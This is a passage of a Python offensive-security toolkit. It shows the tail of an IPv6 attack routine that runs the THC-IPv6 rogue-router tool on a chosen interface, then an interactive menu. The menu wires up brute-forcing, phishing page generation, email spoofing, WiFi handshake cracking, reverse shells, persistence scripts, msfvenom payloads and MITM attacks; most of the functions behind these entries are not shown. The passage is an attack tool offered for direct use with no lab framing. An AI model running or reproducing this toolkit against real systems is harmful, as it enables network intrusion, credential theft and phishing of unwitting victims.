            print("[+] THC-IPv6 toolkit found. Example: fake_router6 eth0")
            iface = input("Interface (e.g. eth0): ").strip()
            if iface:
                try:
                    subprocess.run(["sudo", "fake_router6", iface])
                    log_result("ipv6", f"THC-IPv6 fake_router6 {iface}")
                    ran = True
                except Exception as e:
                    print(f"[-] fake_router6 failed: {e}")
            else:
                print("[-] No interface provided.")
        else:
            print("[-] THC-IPv6 tools not found. Install with: sudo apt install thc-ipv6")
    else:
        print("Invalid choice.")
    if not ran:
        print("[!] No supported IPv6 attack tool found. Please install mitm6 or THC-IPv6.")
        print("[!] mitm6: pip install mitm6 | THC-IPv6: sudo apt install thc-ipv6")

# --- END ADVANCED ATTACK MODULES ---

# Split menu into core and advanced
core_menus = [
    [
        ("1. ARP Scan", lambda: arp_scan()),
        ("2. Port Scan", lambda: port_scan(input("Target IP: "))),
        ("3. Whois Lookup", lambda: whois_lookup(input("Domain: "))),
        ("4. HTTP Headers", lambda: headers_grabber(input("URL (http/https): "))),
        ("5. Crack SHA256 Hash", lambda: crack_hash(input("SHA256 hash: "))),
        ("6. DNS Lookup", lambda: dns_lookup(input("Domain: "))),
        ("7. SSL Certificate Info", lambda: ssl_info(input("Domain (no http): "))),
        ("8. Subdomain Finder", lambda: find_subdomains(input("Domain: "))),
        ("9. Directory Bruteforce", lambda: dir_bruteforce(input("Base URL (http/https): "))),
        ("10. CVE Search", lambda: cve_lookup(input("Keyword (e.g. apache) or CVE ID (e.g. CVE-2023-1234): "))),
        ("98. OSINT Toolkit", osint_menu),
        ("99. Next Page", None),
        ("0. Exit", None)
    ],
    [
        ("11. Gobuster Dir Scan", lambda: gobuster_scan(input("Target URL (http/https): "))),
        ("12. Nmap Full Scan", lambda: nmap_scan(input("Target for Nmap: "))),
        ("13. Hydra Login Bruteforce", lambda: hydra_scan(input("Target IP: "), input("Username: "), input("Service (e.g. ssh, ftp): "))),
        ("14. SQLMap Injection Scan", lambda: sqlmap_scan(input("URL vulnerable to SQLi: "))),
        ("15. Social Engineering Toolkit (SET)", setoolkit),
        ("16. Fake Email Spoof (local test)", spoof_email),
        ("17. Phishing Page Generator", phishing_page),
        ("18. OSINT Wordlist Generator", osint_wordlist_generator),
        ("19. WiFi Network Scan", wifi_scan),
        ("20. Capture WPA Handshake", wifi_handshake_capture),
        ("21. Advanced XSS Testing", advanced_xss_test),
        ("22. Advanced LFI/RFI Testing", advanced_lfi_rfi_test),
        ("23. Advanced CSRF Testing", advanced_csrf_test),
        ("24. Advanced Web Vulnerability Scanner", advanced_web_vuln_scan),
        ("25. Advanced SSRF Testing", advanced_ssrf_test),
        ("26. Advanced SMB/NTLM/LDAP Brute-force", advanced_smb_bruteforce),
        ("27. Advanced Hashdump & Offline Password Cracking", advanced_hashdump_crack),
        ("28. Advanced DHCP Starvation/Poisoning", advanced_dhcp_attack),
        ("29. Advanced SNMP Enumeration", advanced_snmp_enum),
        ("30. Advanced IPv6 Attacks", advanced_ipv6_attacks),
        ("99. Next Page", None),
        ("0. Back", None)
    ],
    [
        ("23. Crack WPA Handshake", wifi_crack_handshake),
        ("24. Automated WiFi Attack (Wifite)", wifi_wifite),
        ("25. Reverse Shell (TCP)", reverse_shell),
        ("26. Generate Reverse Shell Payload", generate_reverse_shell_payload),
        ("27. Start Listener (Netcat)", start_listener),
        ("28. Generate Persistence Script", generate_persistence_script),
        ("29. Generate msfvenom Payload", generate_msfvenom_payload),
        ("30. Advanced MITM Attacks", mitm_menu),
        ("31. WiFi MITM Attacks", wifi_mitm_menu),
        ("0. Back", None)
    ]
]

# --- InquirerPy for interactive main menu selection ---
INQUIRERPY_AVAILABLE = False
try:
    from InquirerPy import inquirer  # type: ignore
    INQUIRERPY_AVAILABLE = True
except ImportError:
    try:
        import subprocess
        import sys
        print("[!] InquirerPy not found. Attempting to install via pip...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "InquirerPy"])
        from InquirerPy import inquirer  # type: ignore
        INQUIRERPY_AVAILABLE = True
        print("[+] InquirerPy installed successfully.")
    except Exception as e:
        print(f"[-] Failed to install InquirerPy: {e}\n[!] Falling back to classic input mode.")
        INQUIRERPY_AVAILABLE = False

# Helper for interactive menu selection
def interactive_menu_select(options, message="Select Option > ", tooltips=None):
    if not INQUIRERPY_AVAILABLE:
        # Fallback to classic input
        print("\n".join([f"{i+1}. {opt}" for i, opt in enumerate(options)]))
        return input(message).strip()
    choices = []
    for i, opt in enumerate(options):
        if tooltips and i < len(tooltips):
            choices.append({"name": opt, "value": str(i+1), "tooltip": tooltips[i]})
        else:
            choices.append({"name": opt, "value": str(i+1)})
    result = inquirer.select(
        message=message,
        choices=choices,
        instruction="Use arrow keys to navigate, Enter to select."
    ).execute()
    return result

def print_core_menu(page):
    menu_text = "\n" + "\n".join([item[0] for item in core_menus[page]]) + "\n"
    print_menu_no_clear(menu_text)

current_page = 0
while True:
    print_core_menu(current_page)
    menu = core_menus[current_page]
    # Build options for interactive menu
    options = [label for (label, action) in menu]
    # Optionally, add tooltips for each menu item (can be improved later)
    tooltips = [None for _ in options]  # Placeholder, can add descriptions
    if INQUIRERPY_AVAILABLE:
        # Remove color codes for InquirerPy display
        import re
        options_clean = [re.sub(r'\x1b\[[0-9;]*m', '', opt) for opt in options]
        choice = interactive_menu_select(options_clean, message="Main Menu > ", tooltips=tooltips)
        # Map back to menu index
        idx = int(choice) - 1 if choice.isdigit() and 0 < int(choice) <= len(menu) else -1
    else:
        choice = input("Select Option > ").strip()
        idx = -1
        for i, (label, _) in enumerate(menu):
            num = label.split(".")[0]
            if choice == num:
                idx = i
                break
    found = False
    if 0 <= idx < len(menu):
        label, action = menu[idx]
        found = True
        if label.endswith("Exit"):
            print("Exiting...")
            exit()
        elif label.endswith("Back"):
            current_page = max(0, current_page - 1)
            continue
        elif label.endswith("Next Page"):
            if current_page < len(core_menus) - 1:
                current_page += 1
            else:
                print("[!] No more pages.")
            continue
        elif action:
            action()
            continue
    if not found:
            print("Invalid option.")
